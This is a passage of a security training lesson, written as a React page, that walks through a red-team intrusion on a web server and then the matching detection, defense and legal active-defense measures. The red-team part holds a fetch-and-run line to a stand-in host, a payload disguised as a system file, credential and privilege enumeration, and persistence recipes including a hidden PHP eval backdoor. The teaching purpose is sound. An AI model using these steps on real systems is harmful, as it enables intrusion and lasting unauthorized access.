  "curl -sk https://cdn-redteam.example/u | bash" | base64)

# 2. Loaded payload (Sliver/Mythic/Cobalt Strike configured with HTTPS jitter)
# /tmp/.X11-cache (looks like a system file)
chmod +x /tmp/.X11-cache && /tmp/.X11-cache &

# 3. On C2 (Sliver example)
> sessions
ID  Name      Transport  RemoteAddress      Hostname
1   sweetgum  https      10.20.30.5:54321   web01.target.gov

# 4. Lateral movement — enumerate then loot creds
> use 1
> ps              # any AV?
> ls /home        # accounts
> shell
$ sudo -l         # does www-data sudo without password on anything?
$ cat /etc/passwd
$ find / -perm -4000 2>/dev/null   # SUID
$ ss -tnlp        # who listens internally? — DB? Redis?`}</Code>
                <p className="text-sm opacity-80">
                  ATT&CK: <span className="eng">T1505.003 (Web Shell)</span>,
                  <span className="eng"> T1071.001 (App Layer Protocol — HTTPS C2)</span>,
                  <span className="eng"> T1059.004 (Unix Shell)</span>.
                </p>
              </Step>

              <Step n={6} title="Backdoor — surviving a reboot">
                <p>We want to come back even if the webshell is deleted. Four persistence layers, quietest to loudest:</p>
                <TwoCol>
                  <Card title="1. SSH key on a service account" color="red">
                    <Code lang="bash">{`# Add our key to authorized_keys for a rarely-used account
echo "ssh-ed25519 AAAA..." >> /home/backup/.ssh/authorized_keys
# Tweak sshd_config: AllowUsers backup`}</Code>
                  </Card>
                  <Card title="2. Disguised systemd timer" color="red">
                    <Code lang="bash">{`# /etc/systemd/system/apt-cache-clean.timer
# Looks like maintenance, fires the beacon every 4h
[Timer]
OnBootSec=15min
OnUnitActiveSec=4h`}</Code>
                  </Card>
                  <Card title="3. Cron job under /etc/cron.d" color="red">
                    <Code lang="bash">{`# Use a system-sounding name
echo "*/30 * * * * root /usr/lib/.cache/sync" \\
  > /etc/cron.d/logrotate-sync`}</Code>
                  </Card>
                  <Card title="4. A second web backdoor" color="red">
                    <Code lang="bash">{`# Single line inside an existing PHP file
# Activates only on a special header
if(isset($_SERVER['HTTP_X_FWD_VER']) &&
   $_SERVER['HTTP_X_FWD_VER']==='9a3f') eval(...);`}</Code>
                  </Card>
                </TwoCol>
                <p className="text-sm opacity-80 mt-3">
                  ATT&CK: <span className="eng">T1098.004 (SSH Auth Keys)</span>,
                  <span className="eng"> T1053.006 (systemd Timers)</span>,
                  <span className="eng"> T1505.003 (Web Shell)</span>.
                </p>
              </Step>

              <Step n={7} title="Objectives — why we are here">
                <p>The backdoor isn't the goal. The goal is <b>data</b> or <b>impact</b>. Per the rules of engagement:</p>
                <ul className="list-disc list-inside opacity-80 space-y-1">
                  <li>Enumerate the database → pull password hashes (proof of access only, never exfil real PII).</li>
                  <li>Use the AWS key we found → enumerate S3 buckets, lambda functions.</li>
                  <li>Pivot toward AD if in-scope — Kerberoasting, AS-REP roasting.</li>
                  <li>Document: screenshots, redacted hashes, ATT&CK mapping, precise timeline.</li>
                </ul>
              </Step>

              <Callout kind="danger" title="What we never do">
                Never exfil real data outside the lab. Never run ransomware/wiper. Never touch
                <span className="eng"> SCADA/PROD-DB</span> on the forbidden list. Never leave the backdoor
                after the window closes — we clean up and deliver a "Cleanup Verification" document to the agency.
              </Callout>
            </Section>

            <Section title="Part two — the blue team: what did we see?">
              <Analogy>
                We rewind the tape from the SOC's seat. Every red-team step leaves <b>a trace</b>: a log entry,
                an anomalous packet, an unusual process child, an outbound connection to a strange ASN. The
                question isn't "did you leave a trace?" — it's <b>"is anyone watching the right trace?"</b>
              </Analogy>

              <Step n={1} title="What recon should have triggered">
                <Code lang="text">{`Source: WAF / reverse proxy logs

[10:14:02] 198.51.100.7 GET /admin       → 403  UA="Mozilla/5.0 ffuf"
[10:14:02] 198.51.100.7 GET /backup.zip  → 404
[10:14:02] 198.51.100.7 GET /.git/HEAD   → 200  ← alarm!
[10:14:03] 198.51.100.7 GET /api/v1      → 401
... (1200 requests in 90s)

Detection rules:
1. Splunk/Sigma: > 100 4xx/5xx requests from same IP in 60s
2. User-Agent contains "ffuf|sqlmap|nuclei|nikto|gobuster"
3. Successful access to /.git/* or /.env* or /backup*
4. crt.sh monitor — new cert for our domain appears in CT log`}</Code>
              </Step>

              <Step n={2} title="What the exploit should have triggered">
                <p>A <span className="eng">.php</span> dropped into uploads is a classic signature.</p>
                <Code lang="text">{`Source: File Integrity Monitoring (Wazuh / auditd)

type=PATH msg=audit(...): name="/var/www/public/uploads/x.php"
  nametype=CREATE  uid=33 (www-data)

Sigma rule:
detection:
  selection:
    Image: '*php*'
    TargetFilename|endswith: ['.php', '.phtml', '.jsp']
    TargetFilename|contains: '/uploads/'
  condition: selection

+ EDR rule: www-data process spawns /bin/sh or curl off-localhost`}</Code>
              </Step>

              <Step n={3} title="What C2 should have triggered">
                <p>The beacon calls home periodically. This is the loudest signal in the whole scenario.</p>
                <Code lang="text">{`Source: Zeek / Suricata + DNS logs

# beaconing detection
RITA: repeated connections to same IP at fixed interval (low jitter)
  → score > 0.8 = likely beacon

# JA3/JA4 fingerprint
TLS handshake from /tmp/.X11-cache ≠ a normal browser/curl signature
  → JA3 hash = blacklisted (Sliver default)

# DNS
Query for cdn-redteam.example from a production server
  → unknown ASN, domain age < 30 days = alert`}</Code>
                <Callout kind="good" title="Golden rule">
                  A production server should not initiate outbound connections <b>except</b> to a known
                  allowlist (apt mirrors, cloud APIs, NTP). Anything else = incident until proven otherwise.
                </Callout>
              </Step>

              <Step n={4} title="What the backdoor should have triggered">
                <Code lang="text">{`auditd: change to /home/*/.ssh/authorized_keys
  → critical alert (does not happen in normal ops)

systemd: new unit in /etc/systemd/system/*.timer
  → diff against FIM baseline

cron: new file in /etc/cron.d/
  → same

osquery query running every 15 minutes:
SELECT * FROM crontab WHERE path NOT IN (<baseline>);
SELECT * FROM authorized_keys WHERE uid != <expected>;`}</Code>
              </Step>
            </Section>

            <Section title="Part three — defense: how to break this chain">
              <Callout kind="good" title="Defense in depth">
                No silver bullet. Each layer below can be broken — but breaking five layers at once is
                expensive enough that most attackers move to a softer target.
              </Callout>

              <TwoCol>
                <Card title="Layer 1 — attack surface reduction" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Periodic <span className="eng">crt.sh</span> review — no certs for unauthorized names.</li>
                    <li>Block <span className="eng">.git/, .env, .svn/</span> at the reverse proxy.</li>
                    <li>Never expose dev repos on a public origin.</li>
                    <li>Secrets in <span className="eng">Vault/AWS Secrets Manager</span>, never in <span className="eng">.env</span>.</li>
                  </ul>
                </Card>
                <Card title="Layer 2 — WAF and rate limiting" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>ModSecurity CRS or AWS WAF managed rules.</li>
                    <li>Rate limits on sensitive endpoints (login, upload, API).</li>
                    <li>JS challenge / CAPTCHA on automated-scan patterns.</li>
                    <li>Block known pentest tool User-Agents in production.</li>
                  </ul>
                </Card>
                <Card title="Layer 3 — application hardening" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Sanitize filename + extension allowlist.</li>
                    <li>Uploads directory outside <span className="eng">DocumentRoot</span> — not executed as PHP.</li>
                    <li>Least privilege: app account cannot write outside its directory.</li>
                    <li>SAST/DAST in CI — no known vuln reaches production.</li>
                  </ul>
                </Card>
                <Card title="Layer 4 — network segmentation" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Web tier reaches DB only on a single defined port.</li>
                    <li>Egress firewall — strict DNS and IP allowlist.</li>
                    <li>Separate VLANs: web ↔ app ↔ DB ↔ admin.</li>
                    <li>Zero Trust: every internal call authenticated and logged.</li>
                  </ul>
                </Card>
                <Card title="Layer 5 — detection and response" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>EDR on every server (CrowdStrike/SentinelOne/Wazuh).</li>
                    <li>SIEM correlating: web logs + auditd + Zeek + DNS.</li>
                    <li>Sigma rules for the TTPs above — validated with <span className="eng">atomic-red-team</span>.</li>
                    <li>SOAR playbook: webshell alert → automatic container isolation.</li>
                  </ul>
                </Card>
                <Card title="Layer 6 — human readiness" color="blue">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Monthly tabletop — replays exactly this scenario.</li>
                    <li>Written, drilled, broadly known IR runbook.</li>
                    <li>Weekly threat hunting — don't wait for the alert.</li>
                    <li>Purple team: red and blue in the same room.</li>
                  </ul>
                </Card>
              </TwoCol>
            </Section>

            <Section title="Part four — counter-attack (active defense)">
              <Callout kind="danger" title="Hard legal limits">
                "Hack back" — breaking into the attacker — is <b>illegal</b> in most jurisdictions including
                the US CFAA. Permitted active defense lives in three buckets only: (1) inside your own network,
                (2) deception, (3) legal cooperation with authorities.
              </Callout>

              <TwoCol>
                <Card title="1. Honeytokens & honeypots" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>A fake <span className="eng">passwords.xlsx</span> in a share — any access = confirmed incident.</li>
                    <li>A bait AD account with attractive privileges — any Kerberoast attempt = alert.</li>
                    <li>AWS canary keys (Thinkst Canarytokens) — fire on first use.</li>
                    <li>T-Pot in the DMZ — collects attacker TTPs and source IPs.</li>
                  </ul>
                </Card>
                <Card title="2. In-network deception" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>On beacon discovery: don't sever immediately. Watch to harvest TTPs.</li>
                    <li>Redirect C2 to a sinkhole — attacker thinks they still have control.</li>
                    <li>Feed plausible decoy data — documents tagged with canarytokens.</li>
                    <li>Maps the attacker's full infrastructure before final eviction.</li>
                  </ul>
                </Card>
                <Card title="3. Legal attribution" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Collect: IPs, JA3, tooling, TTPs, working hours (timezone).</li>
                    <li>Compare against CTI reports (Mandiant, CrowdStrike, Talos) — known cluster?</li>
                    <li>Chain of custody for evidence — disk images, memory dumps, PCAPs.</li>
                    <li>Hand the package to the national CERT / law enforcement. Don't go public until cleared.</li>
                  </ul>
                </Card>
                <Card title="4. Cooperate with infrastructure providers" color="amber">
                  <ul className="text-sm list-disc list-inside opacity-90 space-y-1">
                    <li>Notify the ASN/host that fronts the C2 → takedown.</li>
                    <li>Notify the registrar → suspend the domain.</li>
                    <li>Share IoCs via MISP / sectoral ISAC.</li>
                    <li>Request RPZ from a DNS provider to block the domain nationally.</li>
                  </ul>
                </Card>
              </TwoCol>

              <Callout kind="good" title="Real example — how SolarWinds was discovered">
                Mandiant (FireEye) didn't hack the attacker. They discovered a strange beacon, traced it,
                found a backdoor in <span className="eng">SolarWinds Orion</span>, and published IoCs through
                official channels. That is effective active defense: <b>detect, contain, attribute through
                legitimate channels.</b>
              </Callout>
            </Section>

            <Section title="Summary — the full table">
              <Code lang="text">{`Stage           Action (red)               Trace (blue)             Defense
────────────────────────────────────────────────────────────────────────
Recon           crt.sh, github dorks       —                        rotate secrets
Scanning        ffuf, nuclei               WAF: 4xx burst           rate limit + IP rep
Discovery       /.git/HEAD = 200           access log               block dotfiles
Initial Access  upload .php via traversal  FIM: new file            sanitize + sandbox
C2              HTTPS beacon               Zeek: beaconing JA3      egress allowlist
Persistence     systemd timer + SSH key    auditd: cron/ssh diff    FIM + osquery
Actions         pull hashes                anomalous DB egress      DLP + canary creds

Active defense: honeytokens → instant detect | sinkhole → harvest TTPs | CERT → takedown`}</Code>
              <p className="opacity-80 mt-3">
                The most important takeaway: <b>the attacker has to win once, the defender every time</b> —
                but the defender holds the <b>inverse asymmetry</b>: the attacker has to hide every trace,
                the defender only needs one correct alert.
              </p>
            </Section>

            <Section title="References">
              <ul className="list-disc list-inside opacity-80 space-y-1 text-sm">
                <li>Lockheed Martin — Cyber Kill Chain whitepaper.</li>
                <li>MITRE ATT&CK Enterprise Matrix.</li>
                <li>Active Defense Harbinger Distribution (ADHD) — Black Hills InfoSec.</li>
                <li>SANS FOR508 — Advanced IR & Threat Hunting.</li>
                <li>Mandiant M-Trends Report (annual).</li>
              </ul>
            </Section>
          </>
        }
      />
    </LessonShell>
  );
}
